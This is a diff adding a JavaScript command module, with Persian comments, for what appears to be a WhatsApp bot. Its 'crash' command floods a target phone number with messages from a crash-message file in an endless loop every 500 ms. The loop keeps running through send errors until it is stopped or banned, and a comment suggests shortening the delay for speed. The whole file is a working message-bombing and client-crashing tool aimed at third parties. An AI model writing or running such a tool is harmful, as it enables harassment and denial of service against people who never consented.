@@ -1,0 +1,155 @@
+import fs from "fs";
+import path from "path";
+import { fileURLToPath } from 'url';
+
+// تنظیم مسیرها برای ES Modules
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
+
+// مسیر فایل لیست پیام‌های کرشر
+const CRASH_FILE_PATH = path.join(__dirname, "../data/crash_messages.txt");
+
+// یک آبجکت گلوبال برای ذخیره وضعیت کرشر فعال (برای قابلیت Stop)
+global.activeCrashers = global.activeCrashers || {};
+
+/**
+ * تابع کمکی برای خواندن فایل‌های متنی به صورت آسنکرون
+ */
+async function readCrashFile() {
+    try {
+        if (!fs.existsSync(CRASH_FILE_PATH)) {
+            // اگر فایل نبود، یک نمونه پیش‌فرض بسازیم
+            fs.writeFileSync(CRASH_FILE_PATH, "پیام تست ۱\nپیام تست ۲\nکرش شدید!\n");
+        }
+        const data = await fs.promises.readFile(CRASH_FILE_PATH, 'utf-8');
+        return data.split('\n').map(line => line.trim()).filter(line => line.length > 0);
+    } catch (error) {
+        console.error("خطا در خواندن فایل کرشر:", error);
+        return [];
+    }
+}
+
+/**
+ * تابع اصلی کرشر
+ */
+export default async function crashCommand(sock, from, body, m, args) {
+    
+    // استخراج شماره هدف از آرگومان‌ها
+    // فرمت: !pgr crash 93794384087
+    let target = args[0];
+
+    if (!target) {
+        await sock.sendMessage(from, { text: "❌ لطفاً شماره هدف را وارد کنید.\nمثال: !pgr crash 93794384087" }, { quoted: m });
+        return;
+    }
+
+    // پاکسازی شماره (حذف + یا 00 اگر وجود داشت)
+    target = target.replace(/^\+|00/g, '');
+    
+    // اطمینان از فرمت واتساپ
+    const chatId = `${target}@c.us`;
+
+    // بررسی اینکه آیا قبلاً برای این شماره کرشر فعال است؟
+    if (global.activeCrashers[chatId]) {
+        await sock.sendMessage(from, { text: "⚠️ کرشر برای این شماره در حال اجراست. دستور !pgr stop را بفرستید." }, { quoted: m });
+        return;
+    }
+
+    try {
+        // خواندن پیام‌ها از فایل
+        const messages = await readCrashFile();
+
+        if (messages.length === 0) {
+            await sock.sendMessage(from, { text: "❌ فایل crash_messages.txt خالی است." }, { quoted: m });
+            return;
+        }
+
+        // شروع فرآیند کرشر
+        console.log(`🚀 شروع کرشر به شماره: ${target}`);
+        
+        // ایجاد یک حلقه بی‌نهایت کنترل شده برای ارسال پیام‌ها
+        const startCrash = async () => {
+            let index = 0;
+            
+            // این تایمر را در آبجکت گلوبال ذخیره می‌کنیم تا بتوانیم متوقف کنیم
+            global.activeCrashers[chatId] = {
+                stop: false,
+                interval: null
+            };
+
+            // ارسال پیام شروع به کاربری که دستور را داده (اختیاری)
+            await sock.sendMessage(from, { text: `🔥 کرشر فعال شد! ارسال به ${target}` }, { quoted: m });
+
+            while (!global.activeCrashers[chatId].stop) {
+                const msgText = messages[index % messages.length]; // چرخش روی لیست پیام‌ها
+                
+                try {
+                    await sock.sendMessage(chatId, { text: msgText }, { quoted: m });
+                    
+                    // افزایش ایندکس برای دفعه بعد
+                    index++;
+
+                    // تاخیر بین ارسال‌ها (مثلاً 500 میلی‌ثانیه)
+                    // برای سرعت بیشتر می‌توانید این عدد را کم کنید، مثلاً 100ms
+                    await new Promise(resolve => setTimeout(resolve, 500)); 
+
+                } catch (error) {
+                    // اگر خطایی رخ داد (مثلاً بلاک شدن یا قطع اینترنت)، ادامه بده
+                    console.log(`خطا در ارسال به ${target}:`, error.message);
+                    
+                    // اگر خطای مربوط به Ban باشد، می‌توانیم توقف کنیم
+                    if (error.message.includes('not-authorized') || error.message.includes('timeout')) {
+                         global.activeCrashers[chatId].stop = true;
+                         await sock.sendMessage(from, { text: `⛔ کرشر متوقف شد (خطا: ${error.message})` }, { quoted: m });
+                         break;
+                    }
+                    
+                    // تاخیر کوتاه‌تر در صورت خطا برای جلوگیری از فشار بیش از حد
+                    await new Promise(resolve => setTimeout(resolve, 200));
+                }
+            }
+        };
+
+        // اجرای کرشر (بدون انتظار برای تمام شدن، چون ممکن است طول بکشد)
+        startCrash();
+
+    } catch (error) {
+        console.error("خطای کلی در دستور crash:", error);
+        await sock.sendMessage(from, { text: "❌ خطایی رخ داد." }, { quoted: m });
+    }
+}
+
+/**
+ * تابع کمکی برای متوقف کردن کرشر
+ */
+export async function stopCrash(sock, from, body, m, args) {
+    // اگر شماره داده شده، فقط همان را متوقف کن، وگرنه همه را
+    let target = args[0];
+    
+    if (target) {
+        target = target.replace(/^\+|00/g, '');
+        const chatId = `${target}@c.us`;
+        
+        if (global.activeCrashers[chatId]) {
+            global.activeCrashers[chatId].stop = true;
+            await sock.sendMessage(from, { text: `✅ کرشر برای ${target} متوقف شد.` }, { quoted: m });
+            delete global.activeCrashers[chatId];
+        } else {
+            await sock.sendMessage(from, { text: `⚠️ کرشری برای ${target} در حال اجرا نیست.` }, { quoted: m });
+        }
+    } else {
+        // توقف همه کرشر‌ها
+        let stoppedCount = 0;
+        for (const key in global.activeCrashers) {
+            global.activeCrashers[key].stop = true;
+            stoppedCount++;
+            delete global.activeCrashers[key];
+        }
+        
+        if (stoppedCount > 0) {
+            await sock.sendMessage(from, { text: `✅ ${stoppedCount} کرشر متوقف شد.` }, { quoted: m });
+        } else {
+            await sock.sendMessage(from, { text: "هیچ کرشری در حال اجرا نیست." }, { quoted: m });
+        }
+    }
+}
